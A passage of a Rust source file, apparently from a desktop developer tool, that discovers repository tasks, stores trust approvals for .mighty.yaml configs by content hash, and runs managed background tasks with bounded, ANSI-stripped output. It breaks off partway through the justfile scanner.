//! Repository task discovery, `.mighty.yaml` trust store (`<data>/repo-config-trust.json`), and managed background task
//! runner (`MC-8`).

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use indexmap::IndexMap;
use mighty_core::model::Workspace;
use mighty_core::{time, wire};
use mighty_delegation::git::paths::{DelegationPaths, is_inside, same};
use mighty_delegation::mighty_yaml::{self, LoadedRepoConfig};
use mighty_delegation::run_actions::{self, RunningAction, ScriptOutcome};
use mighty_delegation::worktree_ports::{self, PortBlock};
use mighty_platform::{ChildControl, SpawnRequest};
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use tauri::Manager as _;

use crate::host::{Host, Registry, lock};
use crate::methods::{flag, text};

pub const TRUST_FILE_NAME: &str = "repo-config-trust.json";
const MAXIMUM_SCAN_FILE_BYTES: u64 = 512 * 1024;
const MAXIMUM_OUTPUT_LINES: usize = 80;
const MAXIMUM_OUTPUT_BYTES: usize = 32 * 1024;
const MAXIMUM_KEPT_RUNS: usize = 24;
const MANAGED_TASK_TIMEOUT: Duration = Duration::from_secs(30 * 60);
/// How long the pipes may keep delivering once the task's shell has exited: a grandchild that inherited them (a dev server the task
/// started in the background) must not keep the run "running" for ever.
const PIPE_DRAIN_GRACE: Duration = Duration::from_secs(2);

fn default_trust_version() -> u32 {
    1
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct TrustFile {
    #[serde(default = "default_trust_version")]
    version: u32,
    #[serde(default)]
    approved: BTreeMap<String, String>,
}

/// Discovered project task from `.mighty.yaml`, `package.json`, `Cargo.toml`, `Makefile`, or `justfile`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DiscoveredTask {
    pub id: String,
    pub name: String,
    pub command: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
    pub source: String,
    pub requires_trust: bool,
    /// A run action's `concurrent` (`MC-25`); None for every other task.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub concurrent: Option<bool>,
    /// A run action's `url` (`auto`, `off` or a fixed address); None for every other task.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
}

/// Loaded `.mighty.yaml` / `.mighty.local.yaml` along with its current trust status for the workspace.
#[derive(Debug, Clone)]
pub struct WorkspaceConfigStatus {
    pub loaded: LoadedRepoConfig,
    pub approved: bool,
}

/// Snapshot of a managed task run (or worktree setup failure) returned to the frontend.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskRunSnapshot {
    pub run_id: String,
    pub task_id: String,
    pub name: String,
    pub command: String,
    pub source: String,
    pub workspace_id: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pane_id: Option<String>,
    pub status: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub exit_code: Option<i32>,
    pub output: String,
    pub started_at: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ended_at: Option<String>,
    /// The dev-server address of a run action (found in its output, or its fixed `url`) and its port (`MC-25`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub url_port: Option<u16>,
    /// The address's port lies outside the port block of the worktree it runs in.
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub url_outside_block: bool,
    /// Whether something listens on that port now (read when the panel lists the runs).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub url_listening: Option<bool>,
    /// A run action's `concurrent`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub concurrent: Option<bool>,
}

struct ManagedRunInner {
    task_id: String,
    name: String,
    command: String,
    source: String,
    workspace_id: String,
    pane_id: Option<String>,
    status: String,
    exit_code: Option<i32>,
    ring: OutputRing,
    started_at: String,
    ended_at: Option<String>,
    control: Option<Arc<dyn ChildControl>>,
    /// The repository (normalized main checkout) and folder the run works in, as `ports.json` keys them.
    repo: String,
    folder: String,
    /// The run action's name; None for a task.
    action: Option<String>,
    concurrent: Option<bool>,
    /// `auto`, `off` or a fixed address (run actions only).
    url_mode: Option<String>,
    url: Option<String>,
    url_port: Option<u16>,
    block: Option<PortBlock>,
}

impl ManagedRunInner {
    /// A finished run recorded without a process (a worktree's teardown).
    fn finished(task_id: &str, name: &str, command: &str, workspace_id: &str, pane_id: Option<&str>) -> ManagedRunInner {
        let now = time::now_o();
        ManagedRunInner {
            task_id: task_id.into(),
            name: name.into(),
            command: command.into(),
            source: "mighty".into(),
            workspace_id: workspace_id.into(),
            pane_id: pane_id.map(str::to_string),
            status: "failed".into(),
            exit_code: None,
            ring: OutputRing::default(),
            started_at: now.clone(),
            ended_at: Some(now),
            control: None,
            repo: String::new(),
            folder: String::new(),
            action: None,
            concurrent: None,
            url_mode: None,
            url: None,
            url_port: None,
            block: None,
        }
    }

    /// Reads the dev-server address from the output once (`url: auto`).
    fn detect_url(&mut self) {
        if self.url.is_none()
            && self.url_mode.as_deref() == Some("auto")
            && let Some(found) = run_actions::detect_dev_url(&self.ring.text())
        {
            self.url = Some(found.url);
            self.url_port = Some(found.port);
        }
    }
}

struct ManagedRunHandle {
    run_id: String,
    stopped_by_user: AtomicBool,
    inner: Mutex<ManagedRunInner>,
}

impl ManagedRunHandle {
    fn snapshot(&self) -> TaskRunSnapshot {
        let guard = lock(&self.inner);
        TaskRunSnapshot {
            run_id: self.run_id.clone(),
            task_id: guard.task_id.clone(),
            name: guard.name.clone(),
            command: guard.command.clone(),
            source: guard.source.clone(),
            workspace_id: guard.workspace_id.clone(),
            pane_id: guard.pane_id.clone(),
            status: guard.status.clone(),
            exit_code: guard.exit_code,
            output: guard.ring.text(),
            started_at: guard.started_at.clone(),
            ended_at: guard.ended_at.clone(),
            url: guard.url.clone(),
            url_port: guard.url_port,
            url_outside_block: matches!((guard.url_port, guard.block), (Some(port), Some(block)) if !block.contains(port)),
            url_listening: None,
            concurrent: guard.concurrent,
        }
    }
}

#[derive(Default)]
pub struct RepoTasksState {
    trust_loaded: Mutex<bool>,
    /// Canonical workspace path -> approved 64-hex `content_hash`.
    trust: Mutex<HashMap<String, String>>,
    runs: Mutex<IndexMap<String, Arc<ManagedRunHandle>>>,
    setup_failures: Mutex<HashMap<String, TaskRunSnapshot>>,
}

fn state(host: &Host) -> Arc<RepoTasksState> {
    if let Some(existing) = host.app.try_state::<Arc<RepoTasksState>>() {
        return existing.inner().clone();
    }
    let created = Arc::new(RepoTasksState::default());
    host.app.manage(created.clone());
    if let Some(managed) = host.app.try_state::<Arc<RepoTasksState>>() { managed.inner().clone() } else { created }
}

fn delegation_paths() -> DelegationPaths {
    DelegationPaths::new(crate::platform::file_ports().handles)
}

/// Canonicalizes a workspace path into its stable trust-store lookup key.
pub fn canonical_workspace_key(path: &str) -> String {
    let canonical = delegation_paths().canonical(path);
    if cfg!(windows) { canonical.to_lowercase() } else { canonical }
}

// ── Trust store persistence (`<data_dir>/repo-config-trust.json`) ───────────────────────────────────────────────────────

#[cfg(windows)]
fn is_reparse_point(meta: &std::fs::Metadata) -> bool {
    use std::os::windows::fs::MetadataExt as _;
    const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
    meta.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0
}

#[cfg(not(windows))]
fn is_reparse_point(_meta: &std::fs::Metadata) -> bool {
    false
}

fn is_valid_sha256_hex(hash: &str) -> bool {
    hash.len() == 64 && hash.bytes().all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
}

/// Reads `<data_dir>/repo-config-trust.json`, ignoring symlinks or malformed entries.
pub fn load_trust_map(data_dir: &Path) -> HashMap<String, String> {
    let path = data_dir.join(TRUST_FILE_NAME);
    let meta = match std::fs::symlink_metadata(&path) {
        Ok(meta) => meta,
        Err(_) => return HashMap::new(),
    };
    if meta.file_type().is_symlink() || is_reparse_point(&meta) || !meta.is_file() || meta.len() > MAXIMUM_SCAN_FILE_BYTES {
        return HashMap::new();
    }
    let bytes = match std::fs::read(&path) {
        Ok(bytes) => bytes,
        Err(_) => return HashMap::new(),
    };
    let parsed = match serde_json::from_slice::<TrustFile>(&bytes) {
        Ok(parsed) => parsed,
        Err(_) => return HashMap::new(),
    };
    parsed.approved.into_iter().filter(|(k, v)| !k.trim().is_empty() && is_valid_sha256_hex(v)).collect()
}

/// Atomically writes `<data_dir>/repo-config-trust.json` (`0600` on Unix) via `.tmp` + `rename`.
pub fn save_trust_map(data_dir: &Path, map: &HashMap<String, String>) -> std::io::Result<()> {
    use std::io::Write as _;
    std::fs::create_dir_all(data_dir)?;
    let target = data_dir.join(TRUST_FILE_NAME);
    if let Ok(meta) = std::fs::symlink_metadata(&target)
        && (meta.file_type().is_symlink() || is_reparse_point(&meta))
    {
        return Err(std::io::Error::other("repo-config-trust.json must not be a symbolic link"));
    }
    let ordered: BTreeMap<String, String> =
        map.iter().filter(|(k, v)| !k.trim().is_empty() && is_valid_sha256_hex(v)).map(|(k, v)| (k.clone(), v.clone())).collect();
    let payload = TrustFile { version: 1, approved: ordered };
    let mut bytes = serde_json::to_vec_pretty(&payload).map_err(std::io::Error::other)?;
    bytes.push(b'\n');

    let temp = data_dir.join(format!("{TRUST_FILE_NAME}.{}.{}.tmp", std::process::id(), wire::new_id()));
    let write_result: std::io::Result<()> = (|| {
        #[cfg(unix)]
        let mut file = {
            use std::os::unix::fs::OpenOptionsExt as _;
            std::fs::OpenOptions::new().write(true).create_new(true).mode(0o600).open(&temp)?
        };
        #[cfg(not(unix))]
        let mut file = std::fs::OpenOptions::new().write(true).create_new(true).open(&temp)?;

        file.write_all(&bytes)?;
        file.sync_all()?;
        drop(file);

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::set_permissions(&temp, std::fs::Permissions::from_mode(0o600))?;
        }
        std::fs::rename(&temp, &target)
    })();

    if let Err(err) = write_result {
        let _ = std::fs::remove_file(&temp);
        return Err(err);
    }
    Ok(())
}

fn with_trust<T>(host: &Host, f: impl FnOnce(&mut HashMap<String, String>) -> T) -> T {
    let st = state(host);
    let mut loaded_guard = lock(&st.trust_loaded);
    let mut trust_guard = lock(&st.trust);
    if !*loaded_guard {
        *trust_guard = load_trust_map(&host.data_dir);
        *loaded_guard = true;
    }
    f(&mut trust_guard)
}

/// Checks whether `content_hash` is currently approved for `workspace_path`.
pub fn is_config_approved(host: &Host, workspace_path: &str, content_hash: &str) -> bool {
    if !is_valid_sha256_hex(content_hash) {
        return false;
    }
    let key = canonical_workspace_key(workspace_path);
    with_trust(host, |map| map.get(&key).map(String::as_str) == Some(content_hash))
}

/// Loads `.mighty.yaml` / `.mighty.local.yaml` from `workspace` on disk and checks its current approval status.
pub async fn load_workspace_config(host: &Host, workspace: &Workspace) -> Result<Option<WorkspaceConfigStatus>, String> {
    if workspace.remote.is_some() || workspace.path().is_empty() {
        return Ok(None);
    }
    let ws_path = PathBuf::from(workspace.path());
    let loaded =
        tauri::async_runtime::spawn_blocking(move || mighty_yaml::load_from_folder(&ws_path)).await.map_err(|err| err.to_string())??;
    let Some(loaded) = loaded else {
        return Ok(None);
    };
    let approved = is_config_approved(host, workspace.path(), &loaded.content_hash);
    Ok(Some(WorkspaceConfigStatus { loaded, approved }))
}

/// Re-reads `.mighty.yaml` / `.mighty.local.yaml` from the workspace folder, verifies `expected_hash` still matches, and persists approval.
pub async fn approve_workspace_config(host: &Host, workspace: &Workspace, expected_hash: &str) -> Result<WorkspaceConfigStatus, String> {
    approve_config_in(host, workspace, None, expected_hash).await
}

/// The same for the folder the page showed the config of: a worktree pane's run folder (with the workspace's `.mighty.local.yaml`
/// as the fallback, as the listing reads it), so the hash the person saw is the hash that is approved.
pub async fn approve_config_in(
    host: &Host,
    workspace: &Workspace,
    target_folder: Option<PathBuf>,
    expected_hash: &str,
) -> Result<WorkspaceConfigStatus, String> {
    if workspace.remote.is_some() || workspace.path().is_empty() {
        return Err("Remote workspaces do not support local .mighty.yaml approval.".into());
    }
    if !is_valid_sha256_hex(expected_hash) {
        return Err("Invalid configuration hash.".into());
    }
    let ws_path = PathBuf::from(workspace.path());
    let target = target_folder.unwrap_or_else(|| ws_path.clone());
    let loaded = tauri::async_runtime::spawn_blocking(move || mighty_yaml::load_from_folder_with_local_fallback(&target, &ws_path))
        .await
        .map_err(|err| err.to_string())??
        .ok_or_else(|| "No .mighty.yaml found in workspace.".to_string())?;
    if loaded.content_hash != expected_hash {
        return Err("Repository configuration changed on disk; please review and approve again.".into());
    }
    let key = canonical_workspace_key(workspace.path());
    let snapshot = with_trust(host, |map| {
        map.insert(key, loaded.content_hash.clone());
        map.clone()
    });
    if host.writes() {
        let data_dir = host.data_dir.clone();
        tauri::async_runtime::spawn_blocking(move || save_trust_map(&data_dir, &snapshot))
            .await
            .map_err(|err| err.to_string())?
            .map_err(|err| err.to_string())?;
    }
    Ok(WorkspaceConfigStatus { loaded, approved: true })
}

/// Revokes `.mighty.yaml` trust approval for `workspace`.
pub async fn revoke_workspace_config(host: &Host, workspace: &Workspace) -> Result<(), String> {
    if workspace.remote.is_some() || workspace.path().is_empty() {
        return Ok(());
    }
    let key = canonical_workspace_key(workspace.path());
    let snapshot = with_trust(host, |map| {
        map.remove(&key);
        map.clone()
    });
    if host.writes() {
        let data_dir = host.data_dir.clone();
        tauri::async_runtime::spawn_blocking(move || save_trust_map(&data_dir, &snapshot))
            .await
            .map_err(|err| err.to_string())?
            .map_err(|err| err.to_string())?;
    }
    Ok(())
}

/// Combines `.mighty.yaml` `worktree.setup` (when approved) and `Workspace.worktree_setup_command`.
pub fn combine_setup_commands(mighty_setup: Option<&str>, workspace_setup: Option<&str>) -> Option<String> {
    let m = mighty_setup.map(str::trim).filter(|s| !s.is_empty());
    let w = workspace_setup.map(str::trim).filter(|s| !s.is_empty());
    match (m, w) {
        (Some(a), Some(b)) if a == b => Some(a.to_string()),
        (Some(a), Some(b)) if a.contains('\n') || b.contains('\n') => Some(format!("{a}\n{b}")),
        (Some(a), Some(b)) => Some(format!("{a} && {b}")),
        (Some(a), None) => Some(a.to_string()),
        (None, Some(b)) => Some(b.to_string()),
        (None, None) => None,
    }
}

/// The program and arguments that run `command` through the platform shell: `cmd /d /s /c` on Windows (a script of several lines
/// joined with `&&`), `/bin/sh -c` elsewhere, `-ec` for a script of several lines so that a failing line ends it like `&&` would.
pub fn shell_invocation(command: &str) -> (String, Vec<String>) {
    if cfg!(windows) {
        let comspec = std::env::var("ComSpec").unwrap_or_else(|_| r"C:\Windows\System32\cmd.exe".into());
        (comspec, vec!["/d".into(), "/s".into(), "/c".into(), mighty_yaml::flatten_script(command)])
    } else {
        let flag = if command.contains('\n') { "-ec" } else { "-c" };
        ("/bin/sh".into(), vec![flag.into(), command.to_string()])
    }
}

/// `KEY=value` lines for the approval dialog and the task panel: what `worktree.env` sets, with line breaks shown as `\n`.
pub fn describe_env<'a>(env: impl IntoIterator<Item = (&'a String, &'a String)>) -> Vec<String> {
    env.into_iter().map(|(key, value)| format!("{key}={}", value.replace('\r', "").replace('\n', "\\n"))).collect()
}

/// Resolves the user's login shell environment (`PATH`, tool version manager variables) via `ProviderCatalog::environment`.
pub async fn login_shell_env(host: &Host, workspace_path: Option<&Path>) -> BTreeMap<String, String> {
    let Some(runs) = host.runs() else {
        return BTreeMap::new();
    };
    let env_port = runs.catalog.environment();
    if host.smoke.is_some() { env_port.current().values } else { env_port.resolve(workspace_path, false).await.values }
}

/// Records the last failed worktree setup command output tail for `pane_id` so the user can send it to the agent.
pub fn record_setup_failure(host: &Host, workspace_id: &str, pane_id: &str, command: &str, exit_code: i32, raw_output: &str) {
    let mut ring = OutputRing::default();
    ring.push_text(raw_output);
    let now = time::now_o();
    let snapshot = TaskRunSnapshot {
        run_id: format!("setup-{pane_id}"),
        task_id: "worktree:setup".into(),
        name: "worktree.setup".into(),
        command: command.to_string(),
        source: "mighty".into(),
        workspace_id: workspace_id.to_string(),
        pane_id: Some(pane_id.to_string()),
        status: "failed".into(),
        exit_code: Some(exit_code),
        output: ring.text(),
        started_at: now.clone(),
        ended_at: Some(now),
        url: None,
        url_port: None,
        url_outside_block: false,
        url_listening: None,
        concurrent: None,
    };
    let st = state(host);
    lock(&st.setup_failures).insert(pane_id.to_string(), snapshot);
}

/// Clears any stored setup failure when a pane's worktree setup succeeds.
pub fn clear_setup_failure(host: &Host, pane_id: &str) {
    let st = state(host);
    lock(&st.setup_failures).remove(pane_id);
}

/// Keeps `handle` in the runs list, dropping the oldest finished runs past [`MAXIMUM_KEPT_RUNS`].
fn keep_run(host: &Host, handle: Arc<ManagedRunHandle>) {
    let st = state(host);
    let mut runs = lock(&st.runs);
    runs.insert(handle.run_id.clone(), handle);
    while runs.len() > MAXIMUM_KEPT_RUNS {
        let finished_key = runs.iter().find(|(_, item)| lock(&item.inner).status != "running").map(|(k, _)| k.clone());
        if let Some(key) = finished_key {
            runs.shift_remove(&key);
        } else {
            break;
        }
    }
}

/// Records how a worktree's `teardown` ended (`MC-25`) as a finished run of its workspace, so the task panel shows its output.
pub fn record_teardown(host: &Host, workspace_id: &str, pane_id: &str, command: &str, outcome: &ScriptOutcome, timeout_seconds: u64) {
    let mut inner = ManagedRunInner::finished("worktree:teardown", "worktree.teardown", command, workspace_id, Some(pane_id));
    inner.ring.push_text(&outcome.output);
    if outcome.timed_out {
        inner.ring.push_text(&format!("\n[teardown stopped after {timeout_seconds}s]\n"));
    }
    if let Some(error) = &outcome.error {
        inner.ring.push_text(&format!("\n{error}\n"));
    }
    inner.status = if outcome.succeeded() { "succeeded" } else { "failed" }.into();
    inner.exit_code = Some(outcome.exit_code.unwrap_or(-1));
    keep_run(
        host,
        Arc::new(ManagedRunHandle { run_id: wire::new_id(), stopped_by_user: AtomicBool::new(false), inner: Mutex::new(inner) }),
    );
}

/// Stops every managed run working in the folder `folder_key` (a worktree about to be removed); how many were stopped.
pub async fn stop_runs_in(host: &Host, folder_key: &str) -> usize {
    let ids: Vec<String> = {
        let st = state(host);
        let runs = lock(&st.runs);
        runs.values()
            .filter(|handle| {
                let inner = lock(&handle.inner);
                inner.status == "running" && inner.folder == folder_key
            })
            .map(|handle| handle.run_id.clone())
            .collect()
    };
    for id in &ids {
        let _ = stop_managed_task(host, id).await;
    }
    ids.len()
}

/// The run actions running in the folder `folder_key`, for the worktree bar: `{ name, url }`.
pub fn running_actions_in(host: &Host, folder_key: &str) -> Vec<Value> {
    let st = state(host);
    let runs = lock(&st.runs);
    runs.values()
        .filter_map(|handle| {
            let inner = lock(&handle.inner);
            (inner.status == "running" && inner.folder == folder_key)
                .then(|| inner.action.clone().map(|name| json!({ "name": name, "url": inner.url, "runId": handle.run_id })))
                .flatten()
        })
        .collect()
}

// ── ANSI stripping & 80-line ring buffer ────────────────────────────────────────────────────────────────────────────────

/// Strips ANSI CSI/OSC escape sequences and control characters (normalizing `\r\n` and spinner `\r` overwrites).
pub fn strip_ansi_and_controls(raw: &str) -> String {
    let bytes = raw.as_bytes();
    let mut plain = String::with_capacity(raw.len());
    let mut at = 0usize;
    let mut kept = 0usize;

    while at < bytes.len() {
        if bytes[at] != 0x1b {
            at += 1;
            continue;
        }
        let end = match bytes.get(at + 1) {
            Some(b'[') => {
                let mut i = at + 2;
                while i < bytes.len() && (b'0'..=b'?').contains(&bytes[i]) {
                    i += 1;
                }
                while i < bytes.len() && (b' '..=b'/').contains(&bytes[i]) {
                    i += 1;
                }
                (i < bytes.len() && (b'@'..=b'~').contains(&bytes[i])).then_some(i + 1)
            }
            Some(b']') => {
                let rest = &bytes[at + 2..];
                match rest.iter().position(|c| *c == 0x07) {
                    Some(bell) => Some(at + 2 + bell + 1),
                    None => rest.windows(2).position(|w| w == b"\x1b\\").map(|p| at + 2 + p + 2),
                }
            }
            Some(next) if (0x40..=0x5f).contains(next) => Some(at + 2),
            _ => Some(at + 1),
        };
        if let Some(end) = end {
            plain.push_str(&raw[kept..at]);
            kept = end;
            at = end;
        } else {
            at += 1;
        }
    }
    plain.push_str(&raw[kept..]);

    let normalized = plain.replace("\r\n", "\n");
    let mut lines_out = String::with_capacity(normalized.len());
    for (line_idx, raw_line) in normalized.split('\n').enumerate() {
        if line_idx > 0 {
            lines_out.push('\n');
        }
        let after_cr = raw_line.rsplit('\r').next().unwrap_or(raw_line);
        for ch in after_cr.chars() {
            if ch == '\t' || !ch.is_control() {
                lines_out.push(ch);
            }
        }
    }
    lines_out
}

/// Bounded ring buffer retaining at most the last 80 ANSI-stripped lines (`MAXIMUM_OUTPUT_BYTES` cap).
#[derive(Debug, Default, Clone)]
pub struct OutputRing {
    lines: VecDeque<String>,
    partial: String,
    total_bytes: usize,
}

impl OutputRing {
    pub fn push_bytes(&mut self, chunk: &[u8]) {
        if chunk.is_empty() {
            return;
        }
        let text = String::from_utf8_lossy(chunk);
        self.push_text(&text);
    }

    pub fn push_text(&mut self, chunk: &str) {
        if chunk.is_empty() {
            return;
        }
        let cleaned = strip_ansi_and_controls(chunk);
        let mut parts = cleaned.split('\n').peekable();
        while let Some(segment) = parts.next() {
            self.partial.push_str(segment);
            if self.partial.len() > 4096 {
                let keep_from =
                    self.partial.char_indices().rev().find(|(idx, _)| self.partial.len() - *idx <= 4096).map(|(idx, _)| idx).unwrap_or(0);
                self.partial.drain(..keep_from);
            }
            if parts.peek().is_some() {
                let finished = std::mem::take(&mut self.partial);
                self.push_completed_line(finished);
            }
        }
    }

    fn push_completed_line(&mut self, line: String) {
        self.total_bytes = self.total_bytes.saturating_add(line.len() + 1);
        self.lines.push_back(line);
        while self.lines.len() > MAXIMUM_OUTPUT_LINES || (self.total_bytes > MAXIMUM_OUTPUT_BYTES && self.lines.len() > 1) {
            if let Some(removed) = self.lines.pop_front() {
                self.total_bytes = self.total_bytes.saturating_sub(removed.len() + 1);
            }
        }
    }

    pub fn text(&self) -> String {
        let mut all: Vec<&str> = self.lines.iter().map(String::as_str).collect();
        if !self.partial.is_empty() {
            all.push(self.partial.as_str());
        }
        let start = all.len().saturating_sub(MAXIMUM_OUTPUT_LINES);
        all[start..].join("\n")
    }
}

// ── Auto-detected scripts scanner ───────────────────────────────────────────────────────────────────────────────────────

fn read_regular_text_bounded(path: &Path, max_bytes: u64) -> Option<String> {
    use std::io::Read as _;
    let meta = std::fs::symlink_metadata(path).ok()?;
    if meta.file_type().is_symlink() || is_reparse_point(&meta) || !meta.is_file() || meta.len() > max_bytes {
        return None;
    }
    let file = std::fs::File::open(path).ok()?;
    let mut bytes = Vec::with_capacity((meta.len() as usize).min(max_bytes as usize));
    file.take(max_bytes + 1).read_to_end(&mut bytes).ok()?;
    if bytes.len() as u64 > max_bytes {
        return None;
    }
    String::from_utf8(bytes).ok()
}

/// Chooses `pnpm`, `yarn`, `bun`, or `npm` from lockfiles (checking `target_folder`, then `workspace_folder`), then `packageManager`.
pub fn detect_package_manager(target_folder: &Path, workspace_folder: &Path, package_json: Option<&Value>) -> &'static str {
    for dir in [target_folder, workspace_folder] {
        if dir.join("pnpm-lock.yaml").is_file() {
            return "pnpm";
        }
        if dir.join("yarn.lock").is_file() {
            return "yarn";
        }
        if dir.join("bun.lockb").is_file() || dir.join("bun.lock").is_file() {
            return "bun";
        }
        if dir.join("package-lock.json").is_file() || dir.join("npm-shrinkwrap.json").is_file() {
            return "npm";
        }
    }
    if let Some(pm) = package_json.and_then(|v| v.get("packageManager")).and_then(Value::as_str) {
        let name = pm.split('@').next().unwrap_or("").trim();
        return match name {
            "pnpm" => "pnpm",
            "yarn" => "yarn",
            "bun" => "bun",
            _ => "npm",
        };
    }
    "npm"
}

fn is_safe_script_identifier(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 80
        && !name.starts_with('-')
        && name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b':' | b'.' | b'/' | b'@'))
}

fn scan_package_json(target_folder: &Path, workspace_folder: &Path) -> Vec<DiscoveredTask> {
    let Some(raw) = read_regular_text_bounded(&target_folder.join("package.json"), MAXIMUM_SCAN_FILE_BYTES) else {
        return Vec::new();
    };
    let Ok(parsed) = serde_json::from_str::<Value>(&raw) else {
        return Vec::new();
    };
    let pm = detect_package_manager(target_folder, workspace_folder, Some(&parsed));
    let Some(scripts) = parsed.get("scripts").and_then(Value::as_object) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for (name, val) in scripts.iter().take(64) {
        let Some(cmd_body) = val.as_str().map(str::trim).filter(|s| !s.is_empty()) else {
            continue;
        };
        if !is_safe_script_identifier(name) {
            continue;
        }
        let desc: String = cmd_body.chars().filter(|c| !c.is_control()).take(200).collect();
        out.push(DiscoveredTask {
            id: format!("package.json:{name}"),
            name: name.clone(),
            command: format!("{pm} run {name}"),
            description: (!desc.is_empty()).then_some(desc),
            cwd: None,
            source: "package.json".into(),
            requires_trust: false,
            concurrent: None,
            url: None,
        });
    }
    out
}

fn scan_cargo_toml(target_folder: &Path) -> Vec<DiscoveredTask> {
    let Some(raw) = read_regular_text_bounded(&target_folder.join("Cargo.toml"), MAXIMUM_SCAN_FILE_BYTES) else {
        return Vec::new();
    };
    let mut out = vec![
        DiscoveredTask {
            id: "Cargo.toml:check".into(),
            name: "check".into(),
            command: "cargo check".into(),
            description: Some("Type-check Rust crate(s)".into()),
            cwd: None,
            source: "Cargo.toml".into(),
            requires_trust: false,
            concurrent: None,
            url: None,
        },
        DiscoveredTask {
            id: "Cargo.toml:test".into(),
            name: "test".into(),
            command: "cargo test".into(),
            description: Some("Run Rust tests".into()),
            cwd: None,
            source: "Cargo.toml".into(),
            requires_trust: false,
            concurrent: None,
            url: None,
        },
        DiscoveredTask {
            id: "Cargo.toml:build".into(),
            name: "build".into(),
            command: "cargo build".into(),
            description: Some("Compile Rust targets".into()),
            cwd: None,
            source: "Cargo.toml".into(),
            requires_trust: false,
            concurrent: None,
            url: None,
        },
        DiscoveredTask {
            id: "Cargo.toml:clippy".into(),
            name: "clippy".into(),
            command: "cargo clippy -- -D warnings".into(),
            description: Some("Run Clippy lints".into()),
            cwd: None,
            source: "Cargo.toml".into(),
            requires_trust: false,
            concurrent: None,
            url: None,
        },
    ];

    let built_in_ids: HashSet<String> = out.iter().map(|t| t.id.clone()).collect();
    if let Ok(parsed) = toml::from_str::<toml::Value>(&raw) {
        for section in [
            parsed.get("package").and_then(|p| p.get("metadata")).and_then(|m| m.get("scripts")),
            parsed.get("workspace").and_then(|w| w.get("metadata")).and_then(|m| m.get("scripts")),
        ]
        .into_iter()
        .flatten()
        {
            let Some(table) = section.as_table() else { continue };
            for (name, value) in table.iter().take(32) {
                if !is_safe_script_identifier(name) {
                    continue;
                }
                let (cmd, desc) = match value {
                    toml::Value::String(s) => (s.trim().to_string(), None),
                    toml::Value::Table(t) => {
                        let cmd = t.get("command").or_else(|| t.get("run")).and_then(toml::Value::as_str).unwrap_or("").trim().to_string();
                        let desc = t.get("description").and_then(toml::Value::as_str).map(|d| d.trim().to_string());
                        (cmd, desc)
                    }
                    _ => continue,
                };
                if cmd.is_empty() || cmd.contains(['\n', '\r', '\0']) || cmd.len() > mighty_yaml::MAXIMUM_COMMAND_CHARS {
                    continue;
                }
                let id = format!("Cargo.toml:{name}");
                // The built-in ids always run what they say; a script of the repository never takes one over.
                if built_in_ids.contains(&id) || mighty_yaml::has_invisible_format_chars(&cmd) {
                    continue;
                }
                let item = DiscoveredTask {
                    id: id.clone(),
                    name: name.clone(),
                    command: cmd,
                    description: desc
                        .filter(|d| !d.is_empty())
                        .map(|d| d.chars().filter(|c| !mighty_yaml::is_invisible_format_char(*c)).collect()),
                    cwd: None,
                    source: "Cargo.toml".into(),
                    // An arbitrary shell command from the repository: only once `.mighty.yaml` is approved.
                    requires_trust: true,
                    concurrent: None,
                    url: None,
                };
                if let Some(existing) = out.iter_mut().find(|t| t.id == id) {
                    *existing = item;
                } else {
                    out.push(item);
                }
            }
        }
    }
    out
}

fn scan_makefile(target_folder: &Path) -> Vec<DiscoveredTask> {
    let raw = ["GNUmakefile", "Makefile"]
        .into_iter()
        .find_map(|name| read_regular_text_bounded(&target_folder.join(name), MAXIMUM_SCAN_FILE_BYTES));
    let Some(raw) = raw else {
        return Vec::new();
    };
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for line in raw.lines() {
        if line.starts_with(['\t', ' ', '#']) {
            continue;
        }
        let Some((lhs, rhs)) = line.split_once(':') else { continue };
        if rhs.starts_with('=') || lhs.contains(['=', '$', '%']) {
            continue;
        }
        for target in lhs.split_whitespace() {
            if target.starts_with('.')
                || !is_safe_script_identifier(target)
                || target.contains(['/', '@', ':'])
                || !seen.insert(target.to_string())
            {
                continue;
            }
            out.push(DiscoveredTask {
                id: format!("Makefile:{target}"),
                name: target.to_string(),
                command: format!("make {target}"),
                description: None,
                cwd: None,
                source: "Makefile".into(),
                requires_trust: false,
                concurrent: None,
                url: None,
            });
            if out.len() >= 64 {
                return out;
            }
        }
    }
    out
}

fn scan_justfile(target_folder: &Path) -> Vec<DiscoveredTask> {
    let raw =
        ["justfile", "Justfile"].into_iter().find_map(|name| read_regular_text_bounded(&target_folder.join(name), MAXIMUM_SCAN_FILE_BYTES));
    let Some(raw) = raw else {
        return Vec::new();
    };
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    let mut pending_doc: Option<String> = None;

    for line in raw.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            pending_doc = None;
            continue;
        }
        if let Some(comment) = trimmed.strip_prefix('#') {
            let clean = comment.trim();
            if !clean.is_empty() {
                pending_doc = Some(clean.chars().take(200).collect());
            }
            continue;
